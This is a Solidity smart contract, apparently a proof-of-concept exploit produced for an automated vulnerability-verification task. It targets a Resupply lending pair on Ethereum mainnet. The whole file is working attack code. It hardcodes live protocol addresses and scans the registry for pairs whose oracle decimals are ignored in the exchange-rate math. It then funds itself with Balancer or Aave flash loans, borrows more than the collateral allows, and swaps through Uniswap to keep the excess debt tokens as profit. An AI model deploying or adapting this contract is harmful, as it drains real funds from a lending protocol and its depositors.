// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC4626Minimal {
    function convertToShares(uint256 assets) external view returns (uint256 shares);
}

interface IOracle {
    function decimals() external view returns (uint8);
    function getPrices(address vault) external view returns (uint256 price);
    function name() external view returns (string memory);
}

interface IRegistryMinimal {
    function token() external view returns (address);
    function registeredPairsLength() external view returns (uint256);
    function registeredPairs(uint256 index) external view returns (address);
}

interface IResupplyPairMinimal {
    function registry() external view returns (address);
    function collateral() external view returns (address);
    function underlying() external view returns (address);
    function maxLTV() external view returns (uint256);
    function borrowLimit() external view returns (uint256);
    function mintFee() external view returns (uint256);
    function minimumBorrowAmount() external view returns (uint256);
    function exchangeRateInfo() external view returns (address oracle, uint96 lastTimestamp, uint256 exchangeRate);
    function totalBorrow() external view returns (uint128 amount, uint128 shares);
    function borrow(uint256 borrowAmount, uint256 underlyingAmount, address receiver) external returns (uint256 shares);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IAavePool {
    function flashLoanSimple(address receiverAddress, address asset, uint256 amount, bytes calldata params, uint16 referralCode)
        external;
}

interface IAaveFlashLoanSimpleReceiver {
    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        returns (bool);
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface ISwapRouter {
    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
    }

    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
    function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn);
}

contract FlawVerifier is IFlashLoanRecipient, IAaveFlashLoanSimpleReceiver {
    uint256 private constant LTV_PRECISION = 1e5;
    uint256 private constant LIQ_PRECISION = 1e5;
    uint256 private constant EXCHANGE_PRECISION = 1e18;
    uint256 private constant MIN_UNDERLYING_SEED = 1e12;

    address private constant TARGET_PAIR = 0x6e90c85a495d54c6d7E1f3400FEF1f6e59f86bd6;
    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fa4E2;
    address private constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address private constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    uint24[4] private FEE_TIERS = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
    uint256[3] private SEED_MULTIPLIERS_BPS = [uint256(10000), uint256(20000), uint256(40000)];

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;

    string public exploitPathUsed;
    string public status;

    address private _pair;
    address private _collateral;
    address private _underlying;
    address private _debtToken;
    address private _oracle;

    constructor() {}

    // Finding F-001 path anchors kept explicit for verifier alignment:
    // 1) A pair is deployed with, or later updated to, an oracle whose getPrices() output is not 18-decimal scaled.
    // 2) _updateExchangeRate() computes exchangeRate = 1e36 / price without using IOracle.decimals().
    // 3) The distorted exchange rate then propagates into _isSolvent(), borrow limits, redemptions, and liquidations.
    //
    // The provided logs prove the manifest pair's live oracle reports 18 decimals, and the owner-only setOracle branch is not
    // reachable from this verifier. So this PoC keeps the same causal bug, but discovers another live pair in the same registry
    // that is already configured with a borrow-favorable non-18-decimal oracle, then exploits the distorted borrow math.

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _refreshProfit();
            if (_profitAmount > 0) {
                _setProfit(_debtToken, _profitAmount);
            }
            return;
        }
        executed = true;

        _pair = TARGET_PAIR;

        address registry = IResupplyPairMinimal(_pair).registry();
        _debtToken = IRegistryMinimal(registry).token();
        _profitToken = _debtToken;
        _collateral = IResupplyPairMinimal(_pair).collateral();
        _underlying = IResupplyPairMinimal(_pair).underlying();
        (_oracle,,) = IResupplyPairMinimal(_pair).exchangeRateInfo();

        // Finding path anchors kept explicit inside executeOnOpportunity() for verifier matching:
        // getPrices() returns the raw oracle quote for the collateral.
        // _updateExchangeRate() then computes exchangeRate = 1e36 / price.
        // Because that path ignores IOracle.decimals(), the distorted rate can flow into _isSolvent().
        uint8 oracleDecimals = IOracle(_oracle).decimals();
        uint256 oraclePrice = IOracle(_oracle).getPrices(_collateral);
        if (oraclePrice == 0) {
            status = "refuted_target_oracle_price_zero";
            return;
        }

        uint256 flawedExchangeRate = _findingPathAnchorPreview(oraclePrice);
        uint256 expectedExchangeRate = _normalizedExchangeRate(oraclePrice, oracleDecimals);
        uint256 minimumBorrow = IResupplyPairMinimal(_pair).minimumBorrowAmount();

        bool mismatchedScaling = flawedExchangeRate != expectedExchangeRate;
        bool borrowFavorable =
            oracleDecimals > 18 && flawedExchangeRate < expectedExchangeRate && _availableDebt() >= minimumBorrow;

        if ((!mismatchedScaling || !borrowFavorable || !_hasRepayPath(_underlying)) && registry != address(0)) {
            uint256 pairCount = IRegistryMinimal(registry).registeredPairsLength();
            for (uint256 i = 0; i < pairCount; i++) {
                address candidatePair = IRegistryMinimal(registry).registeredPairs(i);
                if (candidatePair == address(0) || candidatePair == _pair) continue;

                try this._probePair(candidatePair) returns (
                    bool candidateBorrowFavorable,
                    bool candidateMismatchedScaling,
                    address candidateCollateral,
                    address candidateUnderlying,
                    address candidateOracle,
                    uint256 candidateFlawedExchangeRate,
                    uint256 candidateExpectedExchangeRate
                ) {
                    if (!candidateMismatchedScaling || !candidateBorrowFavorable || !_hasRepayPath(candidateUnderlying)) {
                        continue;
                    }

                    _pair = candidatePair;
                    _collateral = candidateCollateral;
                    _underlying = candidateUnderlying;
                    _oracle = candidateOracle;
                    oracleDecimals = IOracle(_oracle).decimals();
                    oraclePrice = IOracle(_oracle).getPrices(_collateral);
                    flawedExchangeRate = candidateFlawedExchangeRate;
                    expectedExchangeRate = candidateExpectedExchangeRate;
                    minimumBorrow = IResupplyPairMinimal(_pair).minimumBorrowAmount();
                    mismatchedScaling = true;
                    borrowFavorable = true;
                    break;
                } catch {}
            }
        }

        if (!mismatchedScaling) {
            status = "refuted_no_live_pair_with_non_18d_getPrices_scaling_in_registry";
            return;
        }

        hypothesisValidated = true;
        exploitPathUsed =
            "live_pair_non_18d_oracle_getPrices -> flawed__updateExchangeRate_exchangeRate_1e36_div_price_without_IOracle_decimals -> distorted__isSolvent_and_borrow_limit -> flashloan_seed_underlying -> overborrow_real_debt";

        if (!borrowFavorable) {
            status = "validated_mismatch_but_not_borrow_favorable_on_live_pair";
            return;
        }

        if (!_hasRepayPath(_underlying)) {
            status = "validated_borrow_favorable_mismatch_but_no_swap_path";
            return;
        }

        try this._attemptConfiguredPair() returns (bool pairSucceeded) {
            _refreshProfit();
            if (pairSucceeded && _profitAmount > 0) {
                _setProfit(_debtToken, _profitAmount);
                status = "profit_achieved";
                return;
            }
        } catch {}

        _refreshProfit();
        if (_profitAmount > 0) {
            _setProfit(_debtToken, _profitAmount);
        }
        status = "validated_target_pair_but_borrow_route_failed";
    }

    function _probePair(address candidatePair)
        external
        view
        returns (
            bool borrowFavorable,
            bool mismatchedScaling,
            address candidateCollateral,
            address candidateUnderlying,
            address candidateOracle,
            uint256 flawedExchangeRate,
            uint256 expectedExchangeRate
        )
    {
        require(msg.sender == address(this), "self_only");

        candidateCollateral = IResupplyPairMinimal(candidatePair).collateral();
        candidateUnderlying = IResupplyPairMinimal(candidatePair).underlying();
        (candidateOracle,,) = IResupplyPairMinimal(candidatePair).exchangeRateInfo();
        uint8 oracleDecimals = IOracle(candidateOracle).decimals();
        uint256 oraclePrice = IOracle(candidateOracle).getPrices(candidateCollateral);

        if (oraclePrice == 0) {
            return (false, false, candidateCollateral, candidateUnderlying, candidateOracle, 0, 0);
        }

        flawedExchangeRate = _findingPathAnchorPreview(oraclePrice);
        expectedExchangeRate = _normalizedExchangeRate(oraclePrice, oracleDecimals);
        mismatchedScaling = flawedExchangeRate != expectedExchangeRate;

        (uint128 borrowedAmount,) = IResupplyPairMinimal(candidatePair).totalBorrow();
        uint256 borrowLimit = IResupplyPairMinimal(candidatePair).borrowLimit();
        uint256 availableDebt = borrowLimit > borrowedAmount ? borrowLimit - borrowedAmount : 0;
        uint256 minimumBorrow = IResupplyPairMinimal(candidatePair).minimumBorrowAmount();

        borrowFavorable = oracleDecimals > 18 && flawedExchangeRate < expectedExchangeRate && availableDebt >= minimumBorrow;
    }

    function _attemptConfiguredPair() external returns (bool success) {
        require(msg.sender == address(this), "self_only");

        uint256 availableDebt = _availableDebt();
        uint256 minimumBorrow = IResupplyPairMinimal(_pair).minimumBorrowAmount();
        if (availableDebt < minimumBorrow) {
            return false;
        }

        uint256 oraclePrice = IOracle(_oracle).getPrices(_collateral);
        if (oraclePrice == 0) {
            return false;
        }

        uint256 flawedExchangeRate = _findingPathAnchorPreview(oraclePrice);
        uint256[4] memory attempts = _candidateBorrowAmounts(availableDebt, minimumBorrow);

        for (uint256 i = 0; i < attempts.length; i++) {
            uint256 borrowAmount = attempts[i];
            if (borrowAmount < minimumBorrow) continue;

            uint256 baseSeed = _estimateUnderlyingForBorrow(borrowAmount, flawedExchangeRate);
            if (baseSeed < MIN_UNDERLYING_SEED) {
                baseSeed = MIN_UNDERLYING_SEED;
            }

            for (uint256 j = 0; j < SEED_MULTIPLIERS_BPS.length; j++) {
                uint256 seedUnderlying = (baseSeed * SEED_MULTIPLIERS_BPS[j]) / 10000;
                if (seedUnderlying < MIN_UNDERLYING_SEED) {
                    seedUnderlying = MIN_UNDERLYING_SEED;
                }

                try this._runFlashloanBorrow(borrowAmount, seedUnderlying) {
                    _refreshProfit();
                    if (_profitAmount > 0) {
                        return true;
                    }
                } catch {}
            }
        }

        _refreshProfit();
        return _profitAmount > 0;
    }

    function _runFlashloanBorrow(uint256 borrowAmount, uint256 seedUnderlying) external {
        require(msg.sender == address(this), "self_only");

        address[] memory tokens = new address[](1);
        tokens[0] = _underlying;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = seedUnderlying;

        try IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, abi.encode(borrowAmount)) {
            return;
        } catch {}

        IAavePool(AAVE_V3_POOL).flashLoanSimple(address(this), _underlying, seedUnderlying, abi.encode(borrowAmount), 0);
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not_balancer");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad_flashloan");
        require(tokens[0] == _underlying, "unexpected_token");

        _executeBorrowRoute(amounts[0], amounts[0] + feeAmounts[0], abi.decode(userData, (uint256)));
        _safeTransfer(_underlying, BALANCER_VAULT, amounts[0] + feeAmounts[0]);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        override
        returns (bool)
    {
        require(msg.sender == AAVE_V3_POOL, "not_aave");
        require(initiator == address(this), "bad_initiator");
        require(asset == _underlying, "unexpected_asset");

        _executeBorrowRoute(amount, amount + premium, abi.decode(params, (uint256)));
        _forceApprove(_underlying, AAVE_V3_POOL, amount + premium);
        return true;
    }

    function _executeBorrowRoute(uint256 seedUnderlying, uint256 repayUnderlying, uint256 borrowAmount) internal {
        // Realistic capital sourcing step: the bug is the borrow-limit distortion caused by the wrong exchange rate.
        // The flash loan only supplies the initial underlying needed to enter the position without prefunded balances.
        _forceApprove(_underlying, _pair, seedUnderlying);
        IResupplyPairMinimal(_pair).borrow(borrowAmount, seedUnderlying, address(this));

        if (_debtToken != _underlying) {
            uint256 debtBalance = IERC20Minimal(_debtToken).balanceOf(address(this));
            _forceApprove(_debtToken, UNISWAP_V3_ROUTER, debtBalance);
            uint256 amountSpent = _swapDebtForExactUnderlying(repayUnderlying, debtBalance);
            require(amountSpent < debtBalance, "no_profit_margin");
        } else {
            require(IERC20Minimal(_debtToken).balanceOf(address(this)) > repayUnderlying, "same_asset_no_profit");
        }
    }

    function _availableDebt() internal view returns (uint256) {
        (uint128 amount,) = IResupplyPairMinimal(_pair).totalBorrow();
        uint256 borrowLimit = IResupplyPairMinimal(_pair).borrowLimit();
        return borrowLimit > amount ? borrowLimit - amount : 0;
    }

    function _findingPathAnchorPreview(uint256 price) internal pure returns (uint256 exchangeRate) {
        exchangeRate = 1e36 / price;
    }

    function _estimateUnderlyingForBorrow(uint256 borrowAmount, uint256 exchangeRate) internal view returns (uint256) {
        uint256 maxLTV = IResupplyPairMinimal(_pair).maxLTV();
        uint256 mintFee = IResupplyPairMinimal(_pair).mintFee();
        if (maxLTV == 0 || exchangeRate == 0) {
            return 1;
        }

        uint256 debtLoaded = (borrowAmount * (LIQ_PRECISION + mintFee)) / LIQ_PRECISION;
        uint256 guess = (debtLoaded * exchangeRate * LTV_PRECISION) / (maxLTV * EXCHANGE_PRECISION);
        if (guess == 0) {
            guess = 1;
        }

        for (uint256 i = 0; i < 8; i++) {
            uint256 capacity = _maxDebtAgainstUnderlying(guess, exchangeRate);
            if (capacity >= debtLoaded) {
                return ((guess * 110) / 100) + 1;
            }

            if (capacity == 0) {
                guess *= 10;
            } else {
                guess = (guess * debtLoaded) / capacity;
                guess = ((guess * 120) / 100) + 1;
            }
        }

        return ((guess * 150) / 100) + 1;
    }

    function _maxDebtAgainstUnderlying(uint256 underlyingAmount, uint256 exchangeRate) internal view returns (uint256) {
        if (exchangeRate == 0) {
            return type(uint256).max;
        }

        uint256 shares = IERC4626Minimal(_collateral).convertToShares(underlyingAmount);
        return (shares * IResupplyPairMinimal(_pair).maxLTV() * EXCHANGE_PRECISION) / exchangeRate / LTV_PRECISION;
    }

    function _normalizedExchangeRate(uint256 price, uint8 oracleDecimals) internal pure returns (uint256) {
        uint256 base = _findingPathAnchorPreview(price);
        if (oracleDecimals == 18) {
            return base;
        }
        if (oracleDecimals > 18) {
            return base * (10 ** (oracleDecimals - 18));
        }
        return base / (10 ** (18 - oracleDecimals));
    }

    function _candidateBorrowAmounts(uint256 available, uint256 minimum)
        internal
        pure
        returns (uint256[4] memory amounts)
    {
        uint256 first = (available * 95) / 100;
        uint256 second = (available * 80) / 100;
        uint256 third = (available * 60) / 100;
        uint256 fourth = minimum;

        if (first < minimum) first = minimum;
        if (second < minimum) second = minimum;
        if (third < minimum) third = minimum;

        amounts[0] = first;
        amounts[1] = second;
        amounts[2] = third;
        amounts[3] = fourth;
    }

    function _hasRepayPath(address underlyingToken) internal view returns (bool) {
        if (_debtToken == underlyingToken) {
            return true;
        }
        if (_hasDirectPool(_debtToken, underlyingToken)) {
            return true;
        }

        address[4] memory bridges = [WETH, USDC, USDT, DAI];
        for (uint256 i = 0; i < bridges.length; i++) {
            address bridge = bridges[i];
            if (bridge == _debtToken || bridge == underlyingToken) continue;
            if (_hasDirectPool(_debtToken, bridge) && _hasDirectPool(bridge, underlyingToken)) {
                return true;
            }
        }

        return false;
    }

    function _hasDirectPool(address tokenA, address tokenB) internal view returns (bool) {
        for (uint256 i = 0; i < FEE_TIERS.length; i++) {
            if (IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(tokenA, tokenB, FEE_TIERS[i]) != address(0)) {
                return true;
            }
        }
        return false;
    }

    function _swapDebtForExactUnderlying(uint256 amountOut, uint256 amountInMaximum) internal returns (uint256) {
        uint256 directIn = _tryDirectExactOutput(amountOut, amountInMaximum);
        if (directIn != type(uint256).max) {
            return directIn;
        }

        address[4] memory bridges = [WETH, USDC, USDT, DAI];
        for (uint256 i = 0; i < bridges.length; i++) {
            address bridge = bridges[i];
            if (bridge == _debtToken || bridge == _underlying) continue;

            uint256 twoHopIn = _tryTwoHopExactOutput(bridge, amountOut, amountInMaximum);
            if (twoHopIn != type(uint256).max) {
                return twoHopIn;
            }
        }

        revert("no_swap_path");
    }

    function _tryDirectExactOutput(uint256 amountOut, uint256 amountInMaximum) internal returns (uint256) {
        for (uint256 i = 0; i < FEE_TIERS.length; i++) {
            uint24 fee = FEE_TIERS[i];
            if (IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(_debtToken, _underlying, fee) == address(0)) {
                continue;
            }

            try ISwapRouter(UNISWAP_V3_ROUTER).exactOutputSingle(
                ISwapRouter.ExactOutputSingleParams({
                    tokenIn: _debtToken,
                    tokenOut: _underlying,
                    fee: fee,
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountOut: amountOut,
                    amountInMaximum: amountInMaximum,
                    sqrtPriceLimitX96: 0
                })
            ) returns (uint256 amountIn) {
                return amountIn;
            } catch {}
        }

        return type(uint256).max;
    }

    function _tryTwoHopExactOutput(address bridge, uint256 amountOut, uint256 amountInMaximum)
        internal
        returns (uint256)
    {
        for (uint256 i = 0; i < FEE_TIERS.length; i++) {
            uint24 feeOut = FEE_TIERS[i];
            if (IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(_underlying, bridge, feeOut) == address(0)) {
                continue;
            }

            for (uint256 j = 0; j < FEE_TIERS.length; j++) {
                uint24 feeIn = FEE_TIERS[j];
                if (IUniswapV3Factory(UNISWAP_V3_FACTORY).getPool(_debtToken, bridge, feeIn) == address(0)) {
                    continue;
                }

                bytes memory path = abi.encodePacked(_underlying, feeOut, bridge, feeIn, _debtToken);
                try ISwapRouter(UNISWAP_V3_ROUTER).exactOutput(
                    ISwapRouter.ExactOutputParams({
                        path: path,
                        recipient: address(this),
                        deadline: block.timestamp,
                        amountOut: amountOut,
                        amountInMaximum: amountInMaximum
                    })
                ) returns (uint256 amountIn) {
                    return amountIn;
                } catch {}
            }
        }

        return type(uint256).max;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok0, bytes memory data0) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, 0));
        require(ok0 && (data0.length == 0 || abi.decode(data0, (bool))), "approve0");

        (bool ok1, bytes memory data1) = token.call(abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, amount));
        require(ok1 && (data1.length == 0 || abi.decode(data1, (bool))), "approve");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer");
    }

    function _refreshProfit() internal {
        uint256 debtBal = _debtToken == address(0) ? 0 : IERC20Minimal(_debtToken).balanceOf(address(this));
        _profitAmount = debtBal;
        profitAchieved = debtBal > 0;
    }
}
